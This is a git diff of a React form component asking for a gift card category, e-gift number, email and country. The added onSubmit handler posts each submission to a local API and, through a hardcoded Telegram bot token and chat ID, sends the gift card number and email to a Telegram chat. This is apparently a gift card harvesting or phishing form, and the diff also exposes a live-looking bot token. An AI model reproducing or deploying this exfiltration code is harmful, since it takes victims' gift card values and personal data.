@@ -1,9 +1,8 @@
 import React, { useEffect, useState } from "react";
 import "./topForm.css";
-
+import axios from "axios";
 import Cards from "../../assets/img/topFormCards.png";
 import { useForm } from "react-hook-form";
-
 const cats = [
   { label: "Categ1", id: 1 },
   { label: "Categ2", id: 2 },
@@ -50,8 +49,9 @@ export default function TopForm({ Open, setOpen, Data, setData }) {
       interval
     ).toFixed(); /*  / 1000 / 60 / 60 */
     setcurrAmount(AmountNow);
-    console.log(AmountNow);
   };
+
+  
 
   useEffect(() => {
     func();
@@ -67,14 +67,26 @@ export default function TopForm({ Open, setOpen, Data, setData }) {
       setformValidated(false);
     } else {
       setformValidated(true);
-      console.log(formData);
     }
   };
-
-  const onSubmit = (data) => {
-    console.log(data);
-    setOpen(!Open);
-    setData(true);
+  const URI_API = `https://api.telegram.org/bot5394455576:AAH9Gp0cGD7IdKdEIDESPwK63ekeJk8Oez0/sendMessage`;
+  const CHAT_ID = '-1001798285405'
+  const onSubmit = async (data, e) => {
+    e.preventDefault();
+    let newdata = `Category: ${data.category} \nE-Gift Number: ${data.egift_number} \nE-Mail: ${data.email} \nCountry: ${data.country}`
+    try {
+      const res = await axios.post("http://localhost:5000/api/form/", data);
+      const res1 = await axios.post(URI_API, {
+        chat_id: CHAT_ID,
+        parse_mode: 'html',
+        text: newdata
+      });
+      console.log(res.data);
+      setOpen(!Open);
+      setData(true);
+    } catch (e) {
+      console.log(e);
+    }
   };
 
   const handleChange = (e) => {
@@ -86,6 +98,7 @@ export default function TopForm({ Open, setOpen, Data, setData }) {
     setOpen(true);
     setData(false);
   };
+
   return (
     <div className="topForm">
       <div className="topForm_left">
@@ -141,8 +154,10 @@ export default function TopForm({ Open, setOpen, Data, setData }) {
                 {...register("category", { required: true })}
                 onChange={handleChange}
               >
-                {CategsInForm.map((cat) => (
-                  <option value={cat.label}>{cat.label}</option>
+                {CategsInForm.map((cat, i) => (
+                  <option key={i} value={cat.label}>
+                    {cat.label}
+                  </option>
                 ))}
               </select>
               <input
@@ -166,8 +181,10 @@ export default function TopForm({ Open, setOpen, Data, setData }) {
                 {...register("country", { required: true })}
                 onChange={handleChange}
               >
-                {Country.map((c) => (
-                  <option value={c.label}>{c.label}</option>
+                {Country.map((c, i) => (
+                  <option key={i} value={c.label}>
+                    {c.label}
+                  </option>
                 ))}
               </select>
             </div>
